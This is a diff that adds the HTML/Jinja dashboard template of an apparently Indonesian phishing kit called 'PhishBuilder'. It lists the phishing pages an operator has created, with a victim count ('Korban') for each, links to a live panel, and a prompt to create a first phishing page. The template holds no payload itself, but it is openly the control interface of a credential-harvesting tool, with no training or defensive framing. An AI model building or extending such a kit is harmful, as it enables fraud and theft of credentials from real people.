@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>PhishBuilder — Home</title>
+<style>
+  :root {
+    --bg: #0f1117;
+    --card: #1a1d27;
+    --border: #2a2e3b;
+    --text: #e4e6ed;
+    --muted: #8b90a0;
+    --accent: #6366f1;
+    --accent2: #22c55e;
+    --danger: #ef4444;
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body { background: var(--bg); color: var(--text); font-family: 'Inter', system-ui, sans-serif; min-height: 100vh; }
+  nav { display: flex; align-items: center; justify-content: space-between; padding: 16px 32px; border-bottom: 1px solid var(--border); background: var(--card); }
+  .logo { font-weight: 700; font-size: 18px; letter-spacing: -0.3px; }
+  .logo span { color: var(--accent); }
+  .nav-links a { color: var(--muted); text-decoration: none; margin-left: 24px; font-size: 14px; transition: color .15s; }
+  .nav-links a:hover, .nav-links a.active { color: var(--text); }
+  .btn { display: inline-flex; align-items: center; gap: 8px; padding: 10px 18px; border-radius: 8px; font-size: 14px; font-weight: 600; border: none; cursor: pointer; text-decoration: none; transition: all .15s; }
+  .btn-primary { background: var(--accent); color: #fff; }
+  .btn-primary:hover { background: #4f46e5; }
+  .container { max-width: 1100px; margin: 0 auto; padding: 40px 24px; }
+  h1 { font-size: 28px; font-weight: 700; margin-bottom: 8px; }
+  .sub { color: var(--muted); margin-bottom: 32px; font-size: 15px; }
+  .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 20px; }
+  .card { background: var(--card); border: 1px solid var(--border); border-radius: 12px; padding: 24px; transition: border-color .15s; }
+  .card:hover { border-color: var(--accent); }
+  .card h3 { font-size: 16px; margin-bottom: 6px; }
+  .card .meta { font-size: 13px; color: var(--muted); margin-bottom: 16px; }
+  .card .stat { display: flex; gap: 16px; font-size: 13px; }
+  .card .stat span { color: var(--accent2); font-weight: 600; }
+  .empty { text-align: center; padding: 80px 20px; color: var(--muted); }
+  .empty h2 { font-size: 20px; margin-bottom: 12px; color: var(--text); }
+</style>
+</head>
+<body>
+<nav>
+  <div class="logo">Phish<span>Builder</span></div>
+  <div class="nav-links">
+    <a href="/" class="active">Home</a>
+    <a href="/create">Create</a>
+    <a href="/logout" style="color:#ef4444">Logout</a>
+  </div>
+</nav>
+<div class="container">
+  <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
+    <div>
+      <h1>Dashboard</h1>
+      <p class="sub">Kelola semua phishing page yang sudah dibuat</p>
+    </div>
+    <a href="/create" class="btn btn-primary">+ Create New</a>
+  </div>
+
+  {% if pages %}
+  <div class="grid">
+    {% for id, p in pages.items() %}
+    <div class="card">
+      <h3>{{ p.title }}</h3>
+      <div class="meta">
+        Template: {{ p.template }} · Dibuat {{ p.created[:10] }}
+      </div>
+      <div class="stat">
+        <div>Korban: <span>{{ p.victims }}</span></div>
+        <div>ID: <code style="color:var(--muted)">{{ id }}</code></div>
+      </div>
+      <div style="margin-top:18px;display:flex;gap:10px">
+        <a href="/dashboard/{{ id }}" class="btn btn-primary" style="padding:8px 14px;font-size:13px">Live Panel</a>
+        <a href="/p/{{ id }}" target="_blank" class="btn" style="background:var(--border);color:var(--text);padding:8px 14px;font-size:13px">Buka Page</a>
+      </div>
+    </div>
+    {% endfor %}
+  </div>
+  {% else %}
+  <div class="empty">
+    <h2>Belum ada page</h2>
+    <p>Buat phishing page pertama kamu sekarang.</p>
+    <br>
+    <a href="/create" class="btn btn-primary">Create Page</a>
+  </div>
+  {% endif %}
+</div>
+</body>
+</html>
